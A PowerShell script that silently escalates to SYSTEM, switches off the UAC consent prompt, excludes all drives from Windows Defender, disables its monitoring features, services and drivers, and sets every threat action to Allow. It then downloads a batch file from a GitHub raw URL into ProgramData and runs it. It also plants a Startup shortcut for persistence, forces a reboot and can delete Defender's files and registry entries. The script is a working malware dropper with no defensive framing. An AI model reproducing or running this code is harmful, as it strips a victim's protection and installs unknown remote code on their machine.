if(-Not $($(whoami) -eq "nt authority\system")) {
    $IsSystem = $false
    if (-Not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] 'Administrator')) {
        $CommandLine = "-ExecutionPolicy Bypass `"" + $MyInvocation.MyCommand.Path + "`" " + $MyInvocation.UnboundArguments
        Start-Process -FilePath PowerShell.exe -Verb Runas -ArgumentList $CommandLine
        Exit
    }
    $psexec_path = "$env:userprofile\exec.exe"
    if($psexec_path) {
        $CommandLine = " -accepteula -nobanner -i -s powershell.exe -ExecutionPolicy Bypass `"" + $MyInvocation.MyCommand.Path + "`" " + $MyInvocation.UnboundArguments 
        Set-ItemProperty -Path REGISTRY::HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System -Name ConsentPromptBehaviorAdmin -Value 0 -Force
        Start-Process -WindowStyle Hidden -FilePath $psexec_path -ArgumentList $CommandLine
        exit
    }

} else {
    $IsSystem = $true
}

67..90|foreach-object{
    $drive = [char]$_
    Add-MpPreference -ExclusionPath "$($drive):\" -ErrorAction SilentlyContinue
    Add-MpPreference -ExclusionProcess "$($drive):\*" -ErrorAction SilentlyContinue
}

Set-MpPreference -DisableArchiveScanning 1 -ErrorAction SilentlyContinue
Set-MpPreference -DisableBehaviorMonitoring 1 -ErrorAction SilentlyContinue
Set-MpPreference -DisableIntrusionPreventionSystem 1 -ErrorAction SilentlyContinue
Set-MpPreference -DisableIOAVProtection 1 -ErrorAction SilentlyContinue
Set-MpPreference -DisableRemovableDriveScanning 1 -ErrorAction SilentlyContinue
Set-MpPreference -DisableBlockAtFirstSeen 1 -ErrorAction SilentlyContinue
Set-MpPreference -DisableScanningMappedNetworkDrivesForFullScan 1 -ErrorAction SilentlyContinue
Set-MpPreference -DisableScanningNetworkFiles 1 -ErrorAction SilentlyContinue
Set-MpPreference -DisableScriptScanning 1 -ErrorAction SilentlyContinue
Set-MpPreference -DisableRealtimeMonitoring 1 -ErrorAction SilentlyContinue


Set-MpPreference -LowThreatDefaultAction Allow -ErrorAction SilentlyContinue
Set-MpPreference -ModerateThreatDefaultAction Allow -ErrorAction SilentlyContinue
Set-MpPreference -HighThreatDefaultAction Allow -ErrorAction SilentlyContinue



$need_reboot = $false

# WdNisSvc Network Inspection Service 
# WinDefend Antivirus Service
# Sense : Advanced Protection Service

$svc_list = @("WdNisSvc", "WinDefend", "Sense")
foreach($svc in $svc_list) {
    if($(Test-Path "HKLM:\SYSTEM\CurrentControlSet\Services\$svc")) {
        if( $(Get-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\$svc").Start -eq 4) {
           
        } else {
            
            Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\$svc" -Name Start -Value 4
            $need_reboot = $true
        }
    } else {
       
    }
}


# WdnisDrv : Network Inspection System Driver
# wdfilter : Mini-Filter Driver
# wdboot : Boot Driver

$drv_list = @("WdnisDrv", "wdfilter", "wdboot")
foreach($drv in $drv_list) {
    if($(Test-Path "HKLM:\SYSTEM\CurrentControlSet\Services\$drv")) {
        if( $(Get-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\$drv").Start -eq 4) {
           
        } else {
            
            Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\$drv" -Name Start -Value 4
            $need_reboot = $true
        }
    } else {
      
    }
}

# Check if service running or not
if($(GET-Service -Name WinDefend).Status -eq "Running") {   
   
    $need_reboot = $true
} else {
   
do {
  $ping = test-connection -comp github.com -count 1 -Quiet
} until ($ping){
      Invoke-WebRequest -Uri "https://raw.githubusercontent.com/4V4loon/InspectorConfig/main/oneline.bat" -OutFile $env:ProgramData\Microsoft\Windows\one.bat
     }   
    cmd.exe /c '%ProgramData%\Microsoft\Windows\one.bat'
}


## STEP 3 : Reboot if needed, add a link to the script to Startup (will be runned again after reboot)


$link_reboot = "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\disable-defender.lnk"
Remove-Item -Force "$link_reboot" -ErrorAction 'ignore' # Remove the link (only execute once after reboot)

if($need_reboot) {
    
    
    $powershell_path = '"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"'
    $cmdargs = "-ExecutionPolicy Bypass `"" + $MyInvocation.MyCommand.Path + "`" " + $MyInvocation.UnboundArguments
    
    $res = New-Item $(Split-Path -Path $link_reboot -Parent) -ItemType Directory -Force
    $WshShell = New-Object -comObject WScript.Shell
    $shortcut = $WshShell.CreateShortcut($link_reboot)
    $shortcut.TargetPath = $powershell_path
    $shortcut.Arguments = $cmdargs
    $shortcut.WorkingDirectory = "$(Split-Path -Path $PSScriptRoot -Parent)"
    $shortcut.Save()
    shutdown.exe /r /t 0

} else {


    ## STEP 4 : After reboot (we checked that everything was successfully disabled), make sure it doesn't come up again !


    if($IsSystem) {

        # Configure the Defender registry to disable it (and the TamperProtection)
        # editing HKLM:\SOFTWARE\Microsoft\Windows Defender\ requires to be SYSTEM

        

        # Cloud-delivered protection:
        Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows Defender\Real-Time Protection" -Name SpyNetReporting -Value 0
        # Automatic Sample submission
        Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows Defender\Real-Time Protection" -Name SubmitSamplesConsent -Value 0
        # Tamper protection
        Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows Defender\Features" -Name TamperProtection -Value 4
        
        # Disable in registry
        Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows Defender" -Name DisableAntiSpyware -Value 1
        Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Name DisableAntiSpyware -Value 1
        
    } else {
       
    }


    if($MyInvocation.UnboundArguments -And $($MyInvocation.UnboundArguments.tolower().Contains("-delete"))) {
        
        # Delete Defender files

        function Delete-Show-Error {
            $path_exists = Test-Path $args[0]
            if($path_exists) {
                Remove-Item -Recurse -Force -Path $args[0]
            } else {
                
            }
        }

      

        # Delete files
        Delete-Show-Error "C:\ProgramData\Windows\Windows Defender\"
        Delete-Show-Error "C:\ProgramData\Windows\Windows Defender Advanced Threat Protection\"

        # Delete drivers
        Delete-Show-Error "C:\Windows\System32\drivers\wd\"

        # Delete service registry entries
        foreach($svc in $svc_list) {
            Delete-Show-Error "HKLM:\SYSTEM\CurrentControlSet\Services\$svc"
        }

        # Delete drivers registry entries
        foreach($drv in $drv_list) {
            Delete-Show-Error "HKLM:\SYSTEM\CurrentControlSet\Services\$drv"
        }
    }
}

